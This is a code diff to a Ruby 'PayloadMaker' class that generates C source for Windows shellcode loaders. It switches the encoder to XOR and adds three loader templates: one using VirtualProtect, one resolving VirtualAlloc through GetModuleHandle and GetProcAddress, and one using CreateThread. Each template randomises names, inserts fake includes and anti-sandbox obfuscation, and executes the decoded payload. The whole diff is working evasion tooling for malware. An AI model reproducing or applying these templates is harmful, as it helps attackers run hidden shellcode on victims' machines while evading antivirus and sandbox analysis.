@@ -41,7 +41,7 @@ class PayloadMaker
         encoded_code = shellcode
         decoded_code = ""
 
-        encoded_code,decoded_code,rand_buf = Encoder::Mixed.new(shellcode).generate if @encoder
+        encoded_code,decoded_code,rand_buf = Encoder::Xor.new(shellcode).generate if @encoder
 
         shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
         string_mod_functions = ["LPVOID #{rand_name1};\n","HANDLE #{rand_name2};\n","SIZE_T #{rand_name3};\n","BOOL #{rand_name4} = FALSE;\n"].shuffle!.join()
@@ -79,6 +79,172 @@ class PayloadMaker
         code << "}"
 
     end
+
+    def compile_function2 # VirtualProtect
+        shellcode = @shellcode
+        rand_buf = random_funcname()
+        rand_name1 = random_funcname()
+        rand_name2 = random_funcname()
+        rand_name3 = random_funcname()
+        rand_name4 = random_funcname()
+        encoded_code = shellcode
+        decoded_code = ""
+
+        # strip shellcode prefix to encode
+        #shellcode.sub!('unsigned char buf[] = ',"")
+
+        # if Encoder is set 
+        encoded_code,decoded_code,rand_buf = Encoder::Xor.new(shellcode).generate if @encoder
+
+        # define variables
+        shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
+        string_mod_functions = ["byte *#{rand_name1} = #{rand_buf};\n","DWORD #{rand_name2} = 0;\n","typedef void (WINAPI *#{rand_name3})();\n"].shuffle!.join()
+
+       
+
+        
+
+        code = "#include <windows.h>\n"
+        code << fake_includes.join("\n")
+
+        
+        code << "\n" + encoded_code + "\n"
+
+        # if Encoder is not set,add the raw shellcode 
+
+        #code << "\n" + shellcode + "\n"
+
+        # main function
+        code << "int main(){\n"
+
+
+        # anti sandbox obfuscate code
+        output_status "Adding anti sandbox obfuscate code."
+        code << AntiSandBox::random_obfuscate
+
+        # decode shellcode
+        code <<  decoded_code + "\n"
+
+        # Declare variables
+        code << string_mod_functions
+
+        # run shellcode functions
+        code << "VirtualProtect(#{rand_name1},sizeof(#{random_memory}),PAGE_EXECUTE_READWRITE,&#{rand_name2});\n"  
+        code << "#{rand_name3} #{rand_name4} = (#{rand_name3})&#{rand_buf}[0];\n"
+        code << "#{rand_name4}();\n"
+        code << "return 0;"
+        code << "}"
+    end
+
+    
+    def compile_function4 # GetModuleHandle
+        shellcode = @shellcode
+        rand_buf = random_funcname()
+        rand_name1 = random_funcname()
+        rand_name2 = random_funcname()
+        rand_name3 = random_funcname()
+        encoded_code = shellcode
+        decoded_code = ""
+
+
+
+        # if Encoder is set 
+        encoded_code,decoded_code,rand_buf = Encoder::Xor.new(shellcode).generate if @encoder
+
+        # define variables
+        shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
+        string_mod_functions = ""
+       
+
+        
+
+        code = "#include <windows.h>\n"
+        code << fake_includes.join("\n")
+
+        
+        code << "\n" + encoded_code + "\n"
+
+        # if Encoder is not set,add the raw shellcode 
+
+        #code << "\n" + shellcode + "\n"
+
+        # main function
+        code << "int main(){\n"
+
+
+        # anti sandbox obfuscate code
+        output_status "Adding anti sandbox obfuscate code."
+        code << AntiSandBox::random_obfuscate
+
+        # decode shellcode
+        code <<  decoded_code + "\n"
+
+        # Declare variables
+        code << string_mod_functions
+
+        # run shellcode functions
+        code << "typedef int (__stdcall *#{rand_name3})(LPVOID,SIZE_T,DWORD,DWORD); \n"
+        code << %Q{#{rand_name3} #{rand_name1} = (#{rand_name3}) GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");\n}
+        code << "LPVOID #{rand_name2} = (LPVOID)#{rand_name1}(NULL, sizeof(#{rand_buf}), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
+        code << "memcpy(#{rand_name2},#{rand_buf},sizeof(#{rand_buf}));\n"
+        code << "(*(void(*)())#{rand_name2})();\n"
+        code << "return 0;\n"
+        code << "}"
+    end
+
+    def compile_function5 # CreateThread
+        shellcode = @shellcode
+        rand_buf = random_funcname()
+        rand_name1 = random_funcname()
+        encoded_code = shellcode
+        decoded_code = ""
+
+
+
+        # if Encoder is set 
+        encoded_code,decoded_code,rand_buf = Encoder::Xor.new(shellcode).generate if @encoder
+
+        # define variables
+        shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
+        string_mod_functions = ""
+       
+
+        
+
+        code = "#include <windows.h>\n"
+        code << fake_includes.join("\n")
+
+        
+        code << "\n" + encoded_code + "\n"
+
+        # if Encoder is not set,add the raw shellcode 
+
+        #code << "\n" + shellcode + "\n"
+
+        # main function
+        code << "int main(){\n"
+
+
+        # anti sandbox obfuscate code
+        output_status "Adding anti sandbox obfuscate code."
+        code << AntiSandBox::random_obfuscate
+
+        # decode shellcode
+        code <<  decoded_code + "\n"
+
+        # Declare variables
+        code << string_mod_functions
+
+        # run shellcode functions
+        code << "LPVOID #{rand_name1} = (LPVOID)VirtualAlloc(NULL, sizeof(#{rand_buf}), MEM_COMMIT, PAGE_EXECUTE_READWRITE); \n"
+        code << "memcpy(#{rand_name1},#{rand_buf},sizeof(#{rand_buf}));\n"
+        code << "CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)(#{rand_name1}),NULL,0,NULL);\n"
+        code << "while(TRUE){Sleep(100);}\n"
+        code << "return 0;\n"
+        code << "}"
+    end
+
+
 
     def compile_random
         compile_functions = []
